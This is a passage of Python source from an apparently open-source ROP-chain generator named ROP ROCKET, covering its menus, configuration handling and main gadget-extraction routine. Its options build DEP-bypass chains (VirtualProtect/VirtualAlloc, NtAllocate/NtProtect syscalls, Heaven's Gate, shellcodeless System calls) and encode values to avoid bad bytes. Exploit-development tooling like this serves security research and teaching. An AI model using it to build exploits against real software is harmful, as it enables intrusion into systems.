					intSuccess, p5 =buildIntOverflowPR(excludeRegs,bad,desired,"",bb,True)
				else:
					intSuccess, p5 =buildIntOverflowPR(excludeRegs,bad,desired,"",bb,True,opt["first_reg"])
				if intSuccess:
					cOut,out=genOutput(p5)
					print (cOut)


			elif userIN[0:1] == "2" or userIN[0:1] == "V":
				print(cya+"  Enter hexadecimal value: " +mag, end="")
				userLines = input()
				desired= int(userLines,16)
				print(res) 
				if not opt["first_reg_enabled"]:
					intSuccess,p6 = buildFoundIntOv(desired,excludeRegs,bad,True)
				else:
					intSuccess,p6 = buildFoundIntOv(desired,excludeRegs,bad,True,opt["first_reg"])
				
				if intSuccess:
					cOut,out=genOutput(p6)
					print (cOut)
				
			elif userIN[0:1] == "3" or userIN[0:3] == "xor":
				print(cya+"  Enter hexadecimal value: " +mag, end="")
				userLines = input()
				desired= int(userLines,16)
				print(res) 
				if not opt["first_reg_enabled"]:
					intSuccess, p3=buildXor(desired,excludeRegs,bad,bb,True)
				else:
					intSuccess, p3=buildXor(desired,excludeRegs,bad,bb,True,opt["first_reg"])
				if intSuccess:
					cOut,out=genOutput(p3)
					print (cOut)
			elif userIN[0:1] == "4" or userIN[0:1] == "X":
				print(cya+"  Enter hexadecimal value: " +mag, end="")
				userLines = input()
				desired= int(userLines,16)
				print(res) 

				if not opt["first_reg_enabled"]:
					intSuccess, p4=buildFoundXor(desired,excludeRegs,bad,bb, True)
				else:
					intSuccess, p4=buildFoundXor(desired,excludeRegs,bad,bb, True,opt["first_reg"])
				if intSuccess:
					cOut,out=genOutput(p4)
					print (cOut)
			elif userIN[0:12] == "555555" or userIN[0:1] == "X":
				print(cya+"  Enter hexadecimal value: " +mag, end="")
				userLines = input()
				desired= int(userLines,16)
				print(res) 
				if not opt["first_reg_enabled"]:
					intSuccess, p1=buildNeg(desired,excludeRegs, bad, True)  
				else:
					intSuccess, p1=buildNeg(desired,excludeRegs, bad, True) ,opt["first_reg"] 
				if intSuccess:
						cOut,out=genOutput(p1)
						print (cOut)
			elif userIN[0:1] == "5" or userIN[0:1] == "n":
				print(cya+"  Enter hexadecimal value: " +mag, end="")
				userLines = input()
				desired= int(userLines,16)
				print(res) 
				if not opt["first_reg_enabled"]:
					intSuccess, p2=buildNot(desired,excludeRegs,bad, True)
				else:
					intSuccess, p2=buildNot(desired,excludeRegs,bad, True,opt["first_reg"])
				if intSuccess:
						cOut,out=genOutput(p2)
						print (cOut)
			elif userIN[0:1] == "6" or userIN[0:2].lower() == "cb":
				opt["badBytes"]=b''
				print ("  Bad bytes have been cleared.")

			elif userIN[0:1] == "7" or userIN[0:1].lower() == "b":
				uiAddBadBytes()
			elif userIN[0:1] == "8" or userIN[0:1] == "r":
				uiRemoveBadBytes()
			elif userIN[0:1] == "9" or userIN[0:1] == "r":
				uiChangeExcludedRegs()
			elif userIN[0:1] == "0" or userIN[0:1] == "0":
				setFirstReg()
			# elif userIN[0:1] == "3" or userIN[0:1] == "n":
			# 	print(cya+" Enter max num. of lines per gadget. Ret does NOT count: " +res, end="")
			# 	userLines = input()
			# 	print(res)
			# 	try: 
			# 		try:
			# 			userLines=int(userLines)
			# 		except:
			# 			userLines=int(userLines,16)
			# 		opt["lenMax"]=userLines
			# 		print ("  The number of lines per gadget to be printed is now " + hex(opt["lenMax"])+".")				
					
			# 	except:
			# 			print ("  Input is rejected.")					
				
			# elif userIN[0:1] == "5" or userIN[0:1] == "p"or userIN[0:1] == "P":
			# 	print ("  This will print gadgets according to settings.")
			# 	if opt["bx86Print"] and opt["bx86Extracted"]:
			# 		print ("  Printing x86 gadgets...")
			# 		printGadgetsx86()
			# 	if opt["bx64Print"] and opt["bx64Extracted"]:
			# 		print ("  Printing x64 gadgets...")
			# 		printGadgetsx64()
			# 	if not opt["bx86Print"] and not opt["bx64Print"]:
			# 		print ("  None selected")

			# elif userIN[0:1] == "5" or userIN[0:1] == "b":
			# 	print ("  This will fetch both x86 and x64 gadgets.")
			# 	getGadgetsx6486()
			elif userIN[0:1] == "q" or userIN[0:1] == "x":
				break			
			elif userIN[0:1] == "h" or userIN[0:7] == "display":
				print(uiShowObfSettings())
			else:
				print("   Invalid input. Enter " + red + "x"+res+" to exit Style.\n")
		except Exception as e:
			print (e)
			print(traceback.format_exc())
			print ("exception")


def saveConf(con):
	global configOptions
	try:
		con.changeConf(configOptions)
		con.save()
		print(gre + "\tConfiguration has been Saved.\n" + res)
	except Exception as e:
		print(red + "\tCould not save configuration." + res, e)
		print(traceback.format_exc())

def modConf():
	global configOptions

	listofStrings=["x86_get", "x64_get", "bytes_max", "img_exc", "system_dlls", "other_dlls", "bad_bytes_imgbase","x86_print", "x64_print", "len_max", "accept_aslr", "accept_seh", "accept_system_windows_dlls", "accept_cfg", "check_for_bad_bytes"]

	listofBools=[opt["bx86Get"],opt["bx64Get"],opt["bytesMax"],opt["bImgExc"],opt["bSystemDlls"],opt["bOtherDlls"], opt["bad_bytes_imgbase"],opt["bx86Print"],opt["bx64Print"],opt["lenMax"],opt["acceptASLR"],opt["acceptSEH"],opt["acceptSystemWin"],opt["acceptCFG"],opt["checkForBadBytes"]]		
	t=0
	for each in listofBools:
		if type(each)!=str:
			listofBools[t]=str(each)
		t+=1


	try:
		for booli, boolStr in zip(listofBools, listofStrings):
			# print (boolStr, booli)
			if type (booli)==bool:
				booli=(str(booli))
			configOptions[boolStr] = booli
		# print (configOptions)
	
	except Exception as e:
		print (e)
		print(traceback.format_exc())
	# dp (configOptions)


def readConf():
	dp ("readConf")
	con = Configuration(conFile)
	conr = con.readConf()
	t_opt={}
	global opt
	opt["bx86Get"] = conr.getboolean('Getting Gadgets', "x86_get")
	opt["bx64Get"] = conr.getboolean('Getting Gadgets', "x64_get")
	try:
		opt["bytesMax"] = int(conr.get('Getting Gadgets', "bytes_max"))
	except:
		opt["bytesMax"] = int(conr.get('Getting Gadgets', "bytes_max"),16)
	opt["bImgExc"] = conr.getboolean('Getting Gadgets', "img_exc")
	opt["bSystemDlls"] = conr.getboolean('Getting Gadgets', "system_dlls")
	opt["bOtherDlls"] = conr.getboolean('Getting Gadgets', "other_dlls")
	# opt["bad_bytes_offset"] = conr.getboolean('Getting Gadgets', "bad_bytes_offset")
	opt["bad_bytes_imgbase"] = conr.getboolean('Getting Gadgets', "bad_bytes_imgbase")
	opt["bx86Print"] = conr.getboolean('Printing', 'x86_print')
	opt["bx64Print"] = conr.getboolean('Printing', 'x64_print')
	try:
		opt["lenMax"] = int(conr.get('Printing', 'len_max'))
	except:
		opt["lenMax"] = int(conr.get('Printing', 'len_max'),16)
	opt["acceptASLR"] = conr.getboolean('Exclusion Criteria', 'accept_aslr')
	opt["acceptSEH"] = conr.getboolean('Exclusion Criteria', 'accept_seh')
	opt["acceptSystemWin"] = conr.getboolean('Exclusion Criteria', 'accept_system_windows_dlls')
	opt["acceptCFG"] = conr.getboolean('Exclusion Criteria', 'accept_cfg')
	opt["checkForBadBytes"] = conr.getboolean('Exclusion Criteria', 'check_for_bad_bytes')

	dp(t_opt)
	dp(opt)

def ui():
	global opt

	splash()
	global dllDict
	# print (dllDict)
	try:
		opt["bx86Extracted"]=False
		opt["bx64Extracted"]=False
		opt["bx86Extracted"]=fg.x86
		opt["bx64Extracted"]=fg.x64
	except:
		pass
	uiShowOptionsMainMenu(opt["bx86Extracted"],opt["bx64Extracted"])
	x = ""

	while x != "e":		#Loops on keyboard input
		try:			#Will break the loop on entering x
			print(yel + " ROP_ROCKET> " + res, end="")
			userIN = input()
			print(res)
			if userIN[0:1] == "x":
				print("\nExiting program.\n")
				break
			
			elif userIN[0:1] == "i":
				# giveInput()
				pass
			elif userIN[0:1] == "R":
				getGadgetsx6486()
			elif userIN[0:1] == "r":
				getGadgetsSubMenu()
			elif userIN[0:1] == "c":				
				con = Configuration(conFile)
				modConf()
				saveConf(con)
			elif userIN[0:1] == "g":
				genHeavanGatex32()
				pass
			elif userIN[0:1] == "t":	
				genHeavanGatex64()
				pass
			elif userIN[0:1] == "a":
				genWinSyscallNtAllocateVirtualMemory()
				pass
			elif userIN[0:1] == "v":
				genWinSyscallNtProtectVirtualMemory()
			elif userIN[0:1] == "s":
				genShellcodelessROP_System()
			elif userIN[0:1] == "m":

				genMovDerefVP()
			elif userIN[0:1] == "!":

				genVirtualProtectPushad()
			elif userIN[0:1] == "@":

				genVirtualAllocPushad()
			elif userIN[0:1] == "b":
				getBadBytesSubmenu()
			elif userIN[0:1] == "d":
				genShellcodelessROP_GetProc()
			elif userIN[0:1] == "o":
				genObfs()
			elif userIN[0:1] == "p":
				printGadgets()
			elif userIN[0:1] == "w":
				findGadget()				
			elif userIN[0:1] == "P":
				if opt["bx86Print"] and opt["bx86Extracted"]:
					print ("  Printing x86 gadgets...")
					printGadgetsx86()
				if opt["bx64Print"] and opt["bx64Extracted"]:
					print ("  Printing x64 gadgets...")
					printGadgetsx64()
			elif(re.match("^b$", userIN)):
				pass
			elif userIN[0:1] == "U" or userIN[0:1] == "u":                  
				pass
			elif userIN[0:1] == "a":	# "change architecture, 32-bit or 64-bit"
				# dp("\nReturning to main menu.\n")
				pass
			elif(re.match("^cc$", userIN)):   # "save configuration"
				print ("Under development")
				break
				con = Configuration(conFile)

				# dp("trying to save!")
				modConf()
				saveConf(con)
			elif userIN[0:1] == "f":
				peFileSubMenu()
			elif userIN[0:1] == "h":
				uiShowOptionsMainMenu(opt["bx86Extracted"],opt["bx64Extracted"])


			else:
				print("\nInvalid input.\n")

		except Exception as e:
			print (e)
			print(traceback.format_exc())
			print ("exception")


if __name__ == "__main__":
	rop=doGadgets()
	fgc=gadgetChains()  #final gadget chains

	filenameRaw=sys.argv[1]
	filename2=filenameRaw[:-4]

	dp (filenameRaw)
	directory=""
	fName=filenameRaw+"_gadgets.obj"

	useSaved=False

	newpath = os.path.abspath(os.path.join(directory, fName))
	if os.path.exists(newpath):
		# print ("file exists")
		useSaved=True
	# else:
	# 	print("file not found", newpath, fName)
	# useSaved=False


	filename=filenameRaw+"_gadgets.obj"
	filenamePE=filenameRaw+"_PE.obj"
	filenameDLL=filenameRaw+"_DllDict.obj"

			
	try:
		doParallel=True
		skipSystemDlls=False
		# skipAllDlls=True
		skipAllDlls=False

		skipNonExtractedDlls=False
		bExtractDlls=True


		if not useSaved:
			if opt["bx86Extracted"] == False and opt["bx64Extracted"]==False:
				print (gre+"   ROP ROCKET is starting. It will extract gadgets, if this has not already been done.\n   These will be saved for subsequent runs."+res)
			Extraction()
		else:
			try:
				filehandlerPE = open(filenamePE, 'rb') 
				pe = pickle.load(filehandlerPE)
				filehandler = open(filename, 'rb') 
				fg = pickle.load(filehandler)
				file_dllDict = open(filenameDLL, 'rb') 
				dllDict = pickle.load(file_dllDict)
				loadP=True
			except:
				print (mag,"Error loading previously saved - extraction restarting.",res)
				Extraction()
				useSaved=False
				# print ("set false")


		if not useSaved:
			
			noneBox=[]
			for each in pe[n].dlls:
				bIsFound, notFound=findDLL_IAT(each)
				if not bIsFound:
					noneBox.append(notFound)
			dp ("noneBox", noneBox)

			digDeeper=False
			for dll in pe:
				if not pe[dll].systemWin:
					if dll != n:
						digDeeper=True
			
			if digDeeper and not skipAllDlls:
				dp ("in dig deeper")
				# timeStart = timeit.default_timer()
				files, subdirectories=  run_fast_scandir(pe[n].path,[".dll"],n)
				# timeStop = timeit.default_timer()
				dp ("run_fast_scandir time")
				# dp(str(# timeStop - # timeStart))
				
			for dll in noneBox:
				findDLLOther(dll)

			evaluateDll(skipSystemDlls, skipAllDlls, None)   # skipSystem, skipAll, skipNonextracted  # none = we do not want to apply nonExtract restriction before extracting
			if bExtractDlls:
				extractDlls()
			evaluateDll(skipSystemDlls, skipAllDlls, skipNonExtractedDlls)   # skipSystem, skipAll, skipNonextracted
			# printPEValuesDict()
			# input()
			filenamePE=filenameRaw+"_PE.obj"
			file_pe = open(filenamePE, 'wb') 
			pickle.dump(pe, file_pe)
			filenameDLL=filenameRaw+"_DllDict.obj"
			file_dllDict = open(filenameDLL, 'wb') 
			pickle.dump(dllDict, file_dllDict)
			


		genBasesForEm()


		n =peName

		# start2 = timeit.default_timer()
		if not useSaved:
			if not doParallel:
				get_OP_RET(15)
			else:
				fgK = foundGadgets()
				startGet_Op_Ret_Parallel()
				# stop2 = timeit.default_timer()
				# dp("Time 3: " + str(stop2 - start2))				
			filename=filenameRaw+"_gadgets.obj"
			file_pi = open(filename, 'wb') 
			pickle.dump(fg, file_pi)
		else:
			# start3 = timeit.default_timer()
			pass
			# filehandler = open(filename, 'rb') 
			# fg = pickle.load(filehandler)

			# file_dllDict = open(filenameDLL, 'rb') 
			# dllDict = pickle.load(file_dllDict)
						
			# stop = timeit.default_timer()
			# dp("Time P: " + str(stop - start3))

		# rop_testerRunROP(pe,n)
		t=0

		# bad=b'\x0d\x0a'
		bad=b''
		frc=foundRopChains()
		rc2.sort(fg.retC2)

		bb=badBytes(bad)
		bb.show()
		readConf()
		# genBasesForEmNew()

		ui()

		popExcludeRegs=[""]
		# hgExcludeRegs=[]

		# buildFoundIntOv(eax,popExcludeRegs)
		availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
		# printOutputs()

		desired=0x00401812
		dp ("build for 0x40")
		# for r in availableRegs:
		# 	intSuccess, p1=buildNeg(desired,popExcludeRegs, bad, True)  
		# 	intSuccess, p2=buildNot(desired,popExcludeRegs,bad, False)
		# 	intSuccess, p3=buildXor(desired,popExcludeRegs,bad,bb)
		# 	intSuccess, p4=buildFoundXor(desired,popExcludeRegs,bad,bb, False)
		# 	intSuccess, p5 =buildIntOverflowPR(popExcludeRegs,bad,desired,"",bb,True)

		# 	foundInt2,p6 = buildFoundIntOv(desired,popExcludeRegs,bad,True)
			
		# dp ("build for 0x40 results")
		# cOut,out=genOutput(p1)
		# cOut,out=genOutput(p2)
		# cOut,out=genOutput(p3)
		# cOut,out=genOutput(p4)
		# cOut,out=genOutput(p5)
		# cOut,out=genOutput(p6)


		# printOutputs()s
		# printOutputs64()

		# dp ("available APIs")
		# dp (dllDict)

		# excludeRegs=["ecx"]
		# vpParams=[0x7877badd, "automatic","automatic",0x0299,0x40,0xbaddcad2]

		# buildMovDeref(excludeRegs,bad, vpParams,6 )
		# buildHG([],[])

		bad=b''
		# patType="System"
		sysNtAllocParams=["tbd","tbd",0xFFFFFFFF,"ptr",0,"ptr",0x3000,0x40,0x6000]
		# buildMovDerefSyscall([],bad, sysNtAllocParams,8 )
		sysNtProtectParms=["tbd", "tbd", 0xffffffff,"ptr", 1, 0x40, "ptr"]
		# buildMovDerefSyscallProtect([],bad, sysNtProtectParms,6 )
		if not loadP:
			file_pi = open(filename, 'wb') 
			pickle.dump(fg, file_pi)
			file_pe = open(filenamePE, 'wb') 
			pickle.dump(pe, file_pe)

			# dp ("dlldict2", dllDict)
			file_dllDict = open(filenameDLL, 'wb') 
			pickle.dump(dllDict, file_dllDict)
			
			dp ("done pickle!")
	except Exception as e:
		dp ("exception main:")
		dp (e)
		dp(traceback.format_exc())
dp ("end")